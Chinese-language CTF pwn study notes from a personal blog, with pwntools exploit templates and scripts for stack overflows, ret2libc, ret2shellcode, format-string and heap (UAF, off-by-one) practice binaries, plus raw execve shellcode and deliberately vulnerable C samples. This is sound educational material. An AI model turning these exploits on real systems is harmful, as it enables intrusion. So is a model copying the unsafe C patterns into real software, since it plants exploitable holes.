# CTF-Pwn学习记录


**Record of Pwn-Learning.**

<!--more-->

**exp的板子**

```python
# -*- coding: UTF-8 -*-
import sys
from pwn import *

context(log_level='debug', arch='i386', os='linux')
#context(log_level='debug',arch='amd64', os='linux')
pwnfile = './pwn200'
if len(sys.argv) < 2:
    io = process(pwnfile)
else:
    io = remote('61.147.171.105', 50890)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

#以调试的模式运行程序
#gdb.attach(io)
#pause()
start_addr = 0x080483d0
func_addr = 0x08048484
padding = 0x70
delimiter = 'Welcome to XDCTF2015~!'
write_plt = elf.symbols['write']
read_plt = elf.symbols['read']


def leak(address):
    payload = flat([b'a' * padding, write_plt, func_addr, 1, address, 4])
    io.sendline(payload)
    # io.sendlineafter(delimiter,payload)
    data = io.recv(4)
    print(data)
    return data


print(io.recv())
dyn = DynELF(leak, elf=ELF(pwnfile))
sys_addr = dyn.lookup("system", 'libc')
print("system address:", hex(sys_addr))
payload1 = flat([b'a' * padding, start_addr])
# io.sendlineafter(delimiter,payload1)
# #调用start函数恢复栈
io.sendline(payload1)
io.recv()

ppp_addr = 0x0804856c
bss_addr = elf.bss()
payload2 = flat([
    b'a' * padding, read_plt, ppp_addr, 0, bss_addr, 8, sys_addr, func_addr,
    bss_addr
])

#payload = b'a' * padding + p32(return_addr) + p32(sh_addr)

io.sendline(payload2)
io.send('/bin/sh')
io.interactive()

```

**DynELF模板**

```python
def leak(address):
    payload='A'*junk+p32(write_plt)+p32(func_addr)+p32(1)+p32(address)+p32(4)
    #junk是溢出需要的字节，利用pwndbg中的cyclic可以计算出
    #write(1,address,4)表示将address向外写
    r.send(payload)
    data = r.recv(4)
    print(data)
    return data

dyn=DynELF(leak,elf=ELF('./pwn200'))#调用DynELF

sys_addr = dyn.lookup('system',libc)
print('system address:',hex(sys_addr))
```

**plt地址和got地址的区别**

```
GOT（Global Offset Table）全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。
PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt没有所需地址的时，触发「链接器」去找到所需地址
```

## 前置知识

### 如何部署Pwn题：

```bash
socat tcp-l:8877,fork exec:./question_2_x64,reuseaddr

```

```python
import socket
import telnetlib
import struct

def P32(val):
	return struct.pack("", val)

def pwn():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1", 8877))
	payload = 'A'*0x8 + '\x10'
	s.sendall(payload + '\n')
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

if __name__ == "__main__":
    # socat tcp-l:8888,fork exec:./question_1_plus_x64,reuseaddr
	pwn()
```

### pwntools各使用模块简介

https://www.cnblogs.com/liuyimin/p/7512252.html

```bash
#基本模块
asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台
dynelf : 用于远程符号泄漏，需要提供leak方法
elf : 对elf文件进行操作，可以获取elf文件中的PLT条目和GOT条目信息
gdb : 配合gdb进行调试，设置断点之后便能够在运行过程中直接调用GDB断下，类似于设置为即使调试JIT
memleak : 用于内存泄漏
shellcraft : shellcode的生成器

#elf 模块
这是一个静态模块，即静态加载ELF文件，然后通过相关接口获取一些信息，常用接口有：
got 获取指定函数的GOT条目
plt 获取指定函数的PLT条目
address 获取ELF的基址
symbols 获取函数的实际地址（待确定）
```

使用elf模块的例子

```python
pwnfile = './2'
elf = ELF(pwnfile)
rop = ROP(pwnfile)

main_addr = elf.symbols['main']
shell_addr = elf.symbols['shell']
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
```



### 如何使用pwngdb进行动态调试

```bash
gcc question_3.c -o question_3
gcc question_3.c -no-pie -o question_3

gdb question_3
start
进入main函数：
disassemble main
64位的程序用：
disassemble $rip
32位的程序用：
disassemble $eip

打断点：
b *0x0000000000401293
查看断点
i b
查看寄存器的情况
i r
看rip到哪了
x/10i $rip
看输入的位置
x/20g $rbp-0x20
x/20b $rbp-0x20
查看func的地址（有符号表就可以打印）
p &func
步出
finish
看内存的基本情况
vmmap

```

### 编译指令

```bash
#关闭栈保护
gcc question_4_1.c -m32 -fno-stack-protector -o main
#全部关闭
gcc -no-pie -fno-stack-protector -z execstack -m32 -o 3.exe 3.c
#-no-pie：地址随机化
#-fno-stack-protector：没有堆栈保护
#-z execstack：堆栈可执行
```

### **编译保护**

#### ASLR：栈地址随机化（必定打开）

#### NX：栈保护

#### Canary（金丝雀）：防止缓冲区溢出

```
原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出了。
```

##### 绕过Canary的方法：

###### 1 泄露栈中的Canary

###### 2 one-by-one 爆破 Canary

###### 3 劫持__stack_chk_fail 函数

###### 4 覆盖 TLS 中储存的 Canary 值



#### PIE：地址无关代码，随即bss、data、text

```
破解PIE保护的方法：虽然函数地址随机化了，但是各个函数之间的偏移量是不变的。
```

### 查看内存的具体情况

```bash
ps -a|grep questio	
cat /proc/10679/maps
```

### 如何更改本地glibc的版本

https://blog.csdn.net/weixin_44864859/article/details/107237134

```bash
patchelf --set-interpreter /home/kali/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so --set-rpath /home/kali/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ 
```



### 常用的一些工具

```bash
#objdump
objdump -t filename
可以查看程序中使用到的函数，查看是否使用一些危险函数
objdump -t .text 3.exe |grep read
可以查看是否使用某一个特定的函数
objdump -d filename
查看程序中函数的汇编代码
objdump -d -M intel 3.exe
可以采用这条命令把它换为因特尔格式的汇编
objdump -d -j .plt filename
可以使用这条命令查看可以利用的函数
objdump -R filename
可以使用这条命令查看对应 got 表

溢出的话，一般会调用system函数，我们可以通过查看是否存在这些函数的反汇编，来判断，
如下，找出了system函数的地址
objdump -d -M intel file|grep system
#利用objdump来找system函数
objdump -d 0 | grep system
#080484d0 <system@plt>:
#80486b9:       e8 12 fe ff ff          call   80484d0 <system@plt>
#cyclic
cyclic 200	会生成200个有序字符串
在输入点输入刚刚生成的字符串让它溢出报错，得到溢出的地方（字符的十六进制）
cyclic -l 0x62616164
得到填充空栈的所需量



#ROPgadget和ropper的使用方法
ROPgadget --binary filename --only "pop|ret"
ROPgadget --binary filename --string "sh"
#利用ROPgadget来查找字符串
ropper -- --search "pop rdi"


```

### Ubuntu各版本对应的libc版本

```
Ubuntu20.04：libc-2.31
Ubuntu18.04：linc-2.27
Ubuntu16.04：libc-2.23
Ubuntu14.04：libc-2.19
```

### Tips

**Tips:rbp的下一行才是返回地址，所以要把rbp那一行也给覆盖了。**

**x86同理，要把ebp那行也覆盖了。**

**在IDA里就是要覆盖到r（r那行不被覆盖）(buf-s)**

got表：包含函数的真实地址，包含libc函数的基址，用于泄露地址

（Global offset Table）：全局偏移表

plt表：不用知道libc函数真实地址，使用plt地址就可以调用函数

（Procedure Linkage Table）：过程链接表

如果手算比较麻烦的话，可以使用 cyclic 来计算要填充垃圾数据的数量

x86 的情况如下：
![](/images/CTF——Pwn学习记录_2024-04-13-19-24-40.png)
x64 的情况如下：
![](/images/CTF——Pwn学习记录_2024-04-13-19-41-06.png)

## 栈学习记录

### 整数溢出

方法一

```
获得原值的二进制表示，
取反所有的位然后在此基础上加1。
```

方法二

```
先计算UINT_MAX - 114514，然后在此基础上再加1
```

例题

不用负号表示-114514

```c
#include <stdio.h>
#include <limits.h>
int main()
{
	//32位
    unsigned int overflowed_value = UINT_MAX - 114514 + 1;
    //64位
    unsigned long long overflowed_value_64bit = ULLONG_MAX - 114514 + 1;
    printf("%u %d\n", overflowed_value, overflowed_value);
    printf("%u %d\n", overflowed_value_64bit, overflowed_value_64bit);
    return 0;
}
```

### 一、有system(sh)不用传参的情况：

直接填充垃圾数据覆盖，然后填上system函数地址即可

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char sh[]="/bin/sh";

int func(char *cmd){
	system(sh);
	return 0;
}

int dofunc(){
    char b[8] = {};
	puts("input:");
	read(0,b,0x100);
	//printf(b);
    return 0;
}

int main(){
    dofunc();
    return 0;
}
```

#### exp：

**x86**

```py
from pwn import *
context(log_level='debug',arch='i386', os='linux')
pwnfile= './question_4_1_x86'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)



padding = 0x14  
#padding = padding2ebp + context.word_size//8   #通过调试得到

gdb.attach(io)
pause()

return_addr = 0x08049182
payload = b'a'*padding + p32(return_addr)
#payload = flat(['a'*padding, return_addr])
delimiter = 'input:'
io.sendlineafter(delimiter, payload)
io.interactive()
```

**x64**

```py
from pwn import *
context(log_level='debug',arch='amd64', os='linux')
pwnfile= './question_4_1_x64'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)



padding = 0x10  
#padding = padding2ebp + context.word_size//8   #通过调试得到

gdb.attach(io)
pause()

return_addr = 0x401142
payload = b'a'* padding + p64(return_addr)
#payload = flat(['a'*padding, return_addr])
delimiter = 'input:'
io.sendlineafter(delimiter, payload)
io.interactive()
```

### 二、有system(cmd)但要传参的情况：

x86填充垃圾数据，然后填上system函数地址，再填上函数的返回地址（0xdeadbeef），最后再填上参数（“/bin/sh”）地址

x64则要使用ROP，构造gadget来pop rdi，然后填上参数（“/bin/sh”）地址，最后填上system函数地址

```bash
#查看ROP gadget的命令
建议是使用多线程的ropper
ropper -f filename

ROPgadget --binary filename --only "pop|ret"
#导出所有可能的gadget
ROPgadget --binary filename > gadgets
```

​		说简单点原理就是把/bin/sh_addr的值放到rdi中，然后再调用system函数

**这里要特别注意x64和x86的区别，函数和参数的先后顺序是反的。**

![0](D:\MD\Pwn学习记录\0.png)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char sh[]="/bin/sh";

int func(char *cmd){
	system(cmd);
	return 0;
}

int dofunc(){
    char b[8] = {};
	puts("input:");
	read(0,b,0x100);
	//printf(b);
    return 0;
}

int main(){
    dofunc();
    return 0;
}
/*
ebp		->	0xdeadbeef 
eip(r)	->	func_addr
		->  0xdeadbeef
		->  argc1
		->	argc2
		->	argc3
*/
```

#### exp:

**x86**

```python
from pwn import *
context(log_level='debug',arch='i386', os='linux')
pwnfile= './question_4_2_x86'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)


padding = 0x14  
#padding = padding2ebp + context.word_size//8   #通过调试得到

gdb.attach(io)
pause()

return_addr = elf.symbols['func']
bin_sh_addr = 0x804C024
payload = b'a'* padding + p32(return_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
#payload = flat(['a'*padding, return_addr])
delimiter = 'input:'
io.sendlineafter(delimiter, payload)
io.interactive()
```

**x64**

**Tips:rbp的下一行才是返回地址，所以要把rbp那一行也给覆盖了。**

**x86同理，要把ebp那行也覆盖了。**

在IDA里就是要覆盖到r（r那行不被覆盖）

打本地时发现的问题：

ubuntu18以上的版本要调栈帧

即在pop rdi之前要先ret一下

```python
from pwn import *
context(log_level='debug',arch='amd64', os='linux')
pwnfile= './question_4_2_x64'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)


padding = 0x10  

#gdb.attach(io)
#pause()

return_addr = elf.symbols['func']
bin_sh_addr = 0x404040
pop_rdi_ret = 0x40120b
payload = b'a'* padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(return_addr)

# p64 => 0x0b 0x12 0x40 0x00 0x00 0x00 0x00 0x00
# p32 => 0x0b 0x12 0x40 0x00
# p16 => 0x0b 0x12
# p8  => 0x0b
# struct.pack

#payload = flat(['a'*padding, return_addr])
delimiter = 'input:'
io.sendlineafter(delimiter, payload)
io.interactive()
```

### 三、ret2libc

Tips：只能泄露已经执行过的函数的got表地址

题目提供Libc版本.so文件与不提供的区别

```python
#题目提供了libc.so文件时
libc=ELF('libc-2.23.so')
libc_base = write_addr - libc.sym['write']
system_addr=libc_base+libc.sym['system']
binsh_addr = libc_base+next(libc.search(b'/bin/sh'))
```

```python
#题目不提供libc.so文件时
from LibcSearcher import *
libc=LibcSearcher('write',write_addr)
libc_base=write_addr-libc.dump('write')
system_addr=libc_base+libc.dump('system')
bin_sh_addr=libc_base+libc.dump('str_bin_sh')
```

这里是通过write函数泄露libc的地址

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int dofunc(){
    char b[8] = {};
	write(1,"input:",6);//2,3,4 fd=open('./a');puts
	read(0,b,0x100);
	write(1,"byebye",6);
    return 0;
}

int main(){
    dofunc();
    return 0;
}
```

**exp:**

x86

```python
# -*- coding: UTF-8 -*-
from pwn import *
context(log_level='debug',arch='i386', os='linux')
pwnfile= './question_5_x86'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)
libc_file_path = '/lib/i386-linux-gnu/libc.so.6' 
libc = ELF(libc_file_path)

padding = 0x14  
leak_func_name = 'write'
leak_func_got = elf.got[leak_func_name]
#要泄露函数的.got.plt的地址
return_addr = elf.symbols['dofunc']
write_sym = elf.symbols['write']
""" pop_edi_ret = 0x4011fb
pop_esi_e15_ret = 0x4011f9 """

payload = flat([b'a'* padding , write_sym , return_addr , 1 , leak_func_got , 4 ])
delimiter = 'input:'
io.sendlineafter(delimiter, payload)

io.recvuntil('byebye')
write_addr = u32(io.recv(4))
print('write_addr:',hex(write_addr))

wirte_offset = libc.symbols[leak_func_name]
libc_addr = write_addr - wirte_offset
print('libc_addr:',hex(libc_addr))

system_offset = libc.symbols['system']
system_addr = libc_addr + system_offset
print('system_addr:',hex(system_addr))

bin_sh_offset = next(libc.search(b'/bin/sh'))
bin_sh_addr = libc_addr + bin_sh_offset
print('bin_sh_addr:',hex(bin_sh_addr))

""" pause()
gdb.attach(io)
pause() """
payload2 = flat([b'a'* padding , system_addr , 0xdeadbeef , bin_sh_addr ])
delimiter = 'input:'
io.sendlineafter(delimiter, payload2)
io.interactive()
```

x64:还有点问题，本地没打通

```python
from pwn import *
context(log_level='debug',arch='amd64', os='linux')
pwnfile= './question_5_x64'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x10

gdb.attach(io)
pause()

leak_func_got=0x404018
return_addr=elf.symbols['dofunc']
write_sym = elf.symbols['write']
pop_rdi_ret = 0x4011fb
pop_rsi_r15_ret = 0x4011f9
payload = b'a'* padding + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(leak_func_got) + p64(0xdeadbeef)
payload += p64(write_sym) + p64(return_addr)

delimiter = 'input:'
io.sendlineafter(delimiter, payload)


io.recvuntil('byebye')
write_addr = u64(io.recv(6).ljust(8,b'\x00'))
print('write_addr:',hex(write_addr))

wirte_offset = 0xEEF20
libc_addr = write_addr - wirte_offset
print('libc_addr:',hex(libc_addr))

system_offset = 0x48E50
system_addr = libc_addr + system_offset
print('system_addr:',hex(system_addr))

bin_sh_offset = 0x18A156-4
bin_sh_addr = libc_addr + bin_sh_offset
print('bin_sh_addr:',hex(bin_sh_addr))


payload2 = b'a'* padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
delimiter = 'input:'
io.sendlineafter(delimiter, payload2)
# pause()
io.interactive()
```

**Plus版本**

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int dofunc(){
    char b[8] = {};
	write(1,"input:",6);
	read(0,b,0x100);
	write(1,"bye",3);
    return 0;
}

int main(){
    dofunc();
    return 0;
}
```

### 四、ret2syscall

想要获得一个shell, 除了system("/bin/sh") 以外, 还有一种更好的方法, 就是系统调用中的 execve("/bin/sh", NULL, NULL)获得shell。我们可以在**Linxu系统调用号表**中找到对应的系统调用号,进行调用, 其中32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。可以用 int 80 汇编指令调用。64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存。 可以用 syscall 汇编指令调用

Linux syscall table：https://publicki.top/old/syscall.html

```bash
vim /usr/include/x86 64-linux-gnu/asm/unistd 32.h
```

### 五、ret2shellcode

要求存放shellcode的这个地址内存页是标识为可执行（比如NX disabled）栈不可执行保护关闭

**32位：**
context.arch=“i386”
print(shellcraft.sh()) 生成的是shell的汇编代码
print(asm(shellcraft.sh())) 生成的是shell的机械码

**64位：**
context.arch=“amd64”
print(shellcraft.sh()) 生成的是shell的汇编代码
print(asm(shellcraft.sh())) 生成的是shell的机械码

例子：

int execve(const char *filename, char *const argv[ ], char *const envp[ ]);

寄存器eax放execve的系统调用号11(0x0b)；
寄存器ebx放文件路径，即第一个参数；
寄存器ecx放第二个参数，是利用数组指针把内容传递给执行文件，并且需要以空指针(NULL)结束；
寄存器edx放最后一个参数，为传递给执行文件的新环境变量数组。

int 0x80：中断
执行系统调用函数execve()时，execve()通过 **int 0x80指令** 进入系统调用入口程序，
并且把系统调用号11放入eax中，接着把参数放入ebx，ecx和edx中。

```c
#include <unistd.h>
int main()
{
    char *argv[] = {"ls", "-al", "/etc/passwd", NULL};
    char *envp[] = {"PATH=/bin", NULL};
    execve("/bin/ls", argv, envp);
}
// #- rw - r -- r -- 1 root root 1712 Nov 20 22 : 59 / etc / passwd
// 这与执行ls -al  /etc/passwd命令所得到的结果是一样的
```

以CTFWIKI里的两道题为例

```python
#利用pwntools生成shellcode
from pwn import *
shellcode=asm(shellcraft.sh())
```

```c
//eg1：
#include <stdio.h>
#include <string.h>
char buf2[100];
int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);
    char buf[100];
    printf("No system for you this time !!!\n");
    gets(buf); //这里明显有溢出点
    strncpy(buf2, buf, 100);
    printf("bye bye ~");
    return 0;
}
```

**exp（本地没打通）**

```python
from pwn import *
p = process('./ret2shellcode')
context.log_level = 'debug' 
buf2_addr = 0x804a080
if args.G:
    gdb.attach(p)
shellcode=asm(shellcraft.sh())
x = shellcode.ljust(112,b'a')
p.recvuntil('No system for you this time !!!\n')
p.sendline(x + p32(buf2_addr))
p.interactive()
```

```c
//eg2
#include <stdio.h>
#include <unistd.h>
int main(){
    char buffer[0x10] = {0};
    setvbuf(stdout, NULL, _IOLBF, 0);
    printf("Welcome to Sniperoj!\n");
    printf("Do your kown what is it : [%p] ?\n", buffer);
    printf("Now give me your answer : \n");
    read(0, buffer, 0x40); //这里同样有溢出
    return 0;
}
```

**exp**

可以知道buf相对于ebp的偏移为0x10,所以其可用的shellcode空间为16+8=24字节，我们有长度为23的shellcode，但是因为其本身是有push指令的，所以如果我们把shellcode放在返回地址的前面，在程序leave的时候会破坏shellcode，所以我们将其放在后面。

```python
from pwn import *
p = process('./shellcode')
context.log_level = 'debug' 
p.recvuntil('[')
buf_addr = p.recvuntil(']', drop=True)
print(buf_addr)
p.recvuntil('Now give me your answer')
shell=b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.sendline(b'a'*24 + p64(int(buf_addr,16)+32) + shell)
p.interactive()
```

### 分辨是哪种类型漏洞的方法：

如果NX enabled（栈不可执行保护开启），则不能用ret2shellcode，只能使用ret2libc

个人还是喜欢直接用ret2libc打

## send和sendline的区别

详细参考这位师傅的博客：https://www.cnblogs.com/ZIKH26/articles/15855666.html

```
read直接从缓冲区读取指定长度的字符
scanf是从第一个非空白字符（空格 换行 制表符）开始读入的，就是你输入的数据，在按下回车的之前，输入的数据都会被存储在输入缓冲区（包括回车），当按下回车键之后，scanf就会开始从输入缓冲区里面读取数据，把读取的数据都传送到你指定的地址，直到遇见了空白符
就停止。它仅仅是遇见空白符停止了，但是空白符以及空白符后面的内容依然在输入缓冲区里面。
gets函数会将最后输入的换行符（也就是回车）从缓冲区中取出来，然后给舍弃，因此缓冲区中不会遗留换行符。但是值得注意的就是，如果当gets溢出的话（我指的是数组溢出），那么它会在你发送所有数据之后会在最后填上一个00，如果不溢出的话，就不会出现这个00。使用gets输入的字节，正好和创建数组的大小一样的话，也会溢出（可能是因为回车的原因，尽管丢弃了，但还是会在输入的字符串结尾填上一个00），也就是说，如果用gets输入溢出数组的话，它会和read的第一种情况一样，把00写入栈中，也会干扰栈中数据。
fgets不会像gets那样自动地去掉结尾的换行符
```

```bash
#一共就四种情况
read 用send
scanf 用sendline
gets 用sendline
fget 用sendline
```

## 栈迁移

特征：栈上溢出空间不满足利用，但别的地方(如bss段)可写并且可调用时

```bash
#主要用到两条命令
leave   --> move esp ebp; pop ebp
ret     --> pop eip
```

一定要注意 pop ebp 和pop rip时esp的地址会自动向下移动一个位置
所以之前布置栈帧时就要先上移一个位置

以32位为例，在汇编中，用call指令来调用一个函数，call 函数等同于

```bash
push eip+4
push ebp
mov ebp,esp
```

其中pop eip相当于将栈顶数据给eip，由于ret返回的是栈顶数据，而栈顶地址是由esp的值决定的，esp的值，从leave可以得出是由ebp决定的。所以我们可以通过覆盖ebp的值来控制ret返回地址。两次leave ret即可控制esp为我们想要的地址。由于有pop ebp，会使esp-4，将ebp 覆盖为想要调整的位置-4即可。或者在调整的位置先写4字节数据也是可行的

## 利用system($0)来getshell

$0在机器码中为 \x24\x30

## seccomp禁用syscall

可以使用seccomp-tools查沙箱禁用规则

```bash
$ seccomp-tools dump ./vuln
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004
 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0004: 0x06 0x00 0x00 0x00000000  return KILL
```

## 使用close(1)关闭了stdout(标准输出)

`close(1)`意味着stdout（标准输出）关闭。程序能够拿到shell，如果程序关闭了stdout，则会无法正常得到回显。这时可以通过执行**`exec 1>&0`或`exec 1>&2`**，将标准输出重定向到标准输入或标准输出错误从而得到回显。

## 格式化字符串学习记录

利用Pwngdb中的fmtarg来快速判断某个参数offset

但需要注意的是我们必须 break 在 printf 处。

```bash
gef➤  fmtarg 0x00007fffffffdb28
The index of format argument : 10
```

### x86

实例程序:

```c
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
```

### 1、获取栈上变量的数值

```bash
%08x.%08x.%08x
```

直接获取栈中被视为第 n+1 个参数的值

利用如下的字符串，我们就可以获取到对应的第 n+1 个参数的数值

```bash
%n$x
```

Summary

```
1.利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。
2.利用 %s 来获取变量所对应地址的内容，只不过有零截断。
3.利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。
```

### 2、泄露任意地址内存

AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p

先通过tag找格式化字符串的位置%4

AAAA0xffaab1600xc20xf76146bb**0x41414141**0x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%

通过格式化字符串泄露scanf函数的got表地址

#### exp：

```python
from pwn import *
sh = process('./main')
leakmemory = ELF('./main')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print (hex(__isoc99_scanf_got))
payload = p32(__isoc99_scanf_got) + b'%4$s'
print (payload)
# gdb.attach(sh)
sh.sendline(payload)
sh.recvuntil('%4$s\n')
print (hex(u32(sh.recv()[4:8]))) # remove the first bytes of __isoc99_scanf@got
sh.interactive()
```

### 3、覆盖内存

**a、覆盖栈内存**

```c
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
    puts("modified b for a big number!");
  }
  return 0;
}
```

#### exp：

```python
# -*- encoding: utf-8 -*-
from pwn import *
def forc():
    sh = process('./main')
    c_addr = int(sh.recvuntil('\n', drop=True), 16)
    print (hex(c_addr))
    payload = p32(c_addr) + b'%012d' + b'%6$n'
    # %n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
    # %012的意思是如果输出的整型数不足12位，左侧用0补齐
    print (payload)
    #gdb.attach(sh)
    sh.sendline(payload)
    print (sh.recv())
    sh.interactive()

forc()
```

**b、覆盖任意地址内存**

**覆盖小数字**

```python
from pwn import*
def fora():
    sh = process('./main')
    a_addr = 0x0804C024
    payload = b'aa%8$naa' + p32(a_addr)
    sh.sendline(payload)
    print (sh.recv())
    sh.interactive()
    
fora()
```

**覆盖大数字**（有点问题）

```python
# -*- encoding: utf-8 -*-
from pwn import*

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    #确定覆盖的是第几个参数
    return fmtstr


def fmt_str(offset, size, addr, target):
#offset 表示要覆盖的地址最初的偏移
# size 表示机器字长
# addr 表示将要覆盖的地址。
# target 表示我们要覆盖为的目的变量值
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
            # 确定操作系统的架构
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

def forb():
    sh = process('./main')
    payload = fmt_str(6, 4, 0x0804A028, 0x12345678)
    print(payload)
    sh.sendline(payload)
    print(sh.recv())
    sh.interactive()

forb()
```

### x64

Tips:其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。

下面的goodluck就是64位数的例子

## 堆学习记录

### 堆溢出

#### 寻找危险函数

输入：gets，直接读取一行，忽略 `'\x00'`

​			scanf

​			vscanf

输出：sprintf

字符串：strcpy，字符串复制，遇到 `'\x00'` 停止

​				strcat，字符串拼接，遇到 `'\x00'` 停止

​				bcopy

#### 确定填充长度

​	实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。

### UAF(Use After Free)漏洞

示例一

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(notelist[v1]->content);
    free(notelist[v1]);                         // 存在UAF
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

**exp:**

```python
# -*- coding: utf-8 -*-
from pwn import *
r = process('./hacknote')
def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

gdb.attach(r)
magic = 0x08048986
addnote(32, "aaaa")
addnote(32, "ddaa")
delnote(0)
delnote(1)
addnote(8, p32(magic))
printnote(0)
r.interactive()
```



### 堆中的 Off-By-One

#### 示例一：循环的次数设置错误

```c
int my_gets(char *ptr,int size)
{
    int i;
    for(i=0;i<=size;i++)
    {
        ptr[i]=getchar();
        //my_gets 函数导致了一个 off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了一次，这也被称为栅栏错误
    }
    return i;
}
int main()
{
    void *chunk1,*chunk2;
    chunk1=malloc(16);
    chunk2=malloc(16);
    puts("Get Input:");
    my_gets(chunk1,16);
    return 0;
}
```

```bash
0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1
0x602010:   0x4141414141414141  0x4141414141414141
0x602020:   0x0000000000000041  0x0000000000000021 <=== chunk2
0x602030:   0x0000000000000000  0x0000000000000000
```

#### 示例二：字符串的结束符计算有误

```c
int main(void)
{
    char buffer[40]="";
    void *chunk1;
    chunk1=malloc(24);
    puts("Get Input");
    gets(buffer);
    if(strlen(buffer)==24)
    {
        strcpy(chunk1,buffer);
        //strlen 是我们很熟悉的计算 ascii 字符串长度的函数，
        //这个函数在计算字符串长度时是不把结束符 '\x00' 计算在内的，
        //但是 strcpy 在复制字符串时会拷贝结束符 '\x00'
    }
    return 0;
}
```

```bash
0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000411 <=== next chunk
```

```bash
0x602000:   0x0000000000000000  0x0000000000000021
0x602010:   0x4141414141414141  0x4141414141414141
0x602020:   0x4141414141414141  0x0000000000000400
# next chunk 的 size 域低字节被结束符 '\x00' 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one
```


---

> Author: [Lunatic](https://goodlunatic.github.io)  
> URL: https://goodlunatic.github.io/posts/5e91e89/  

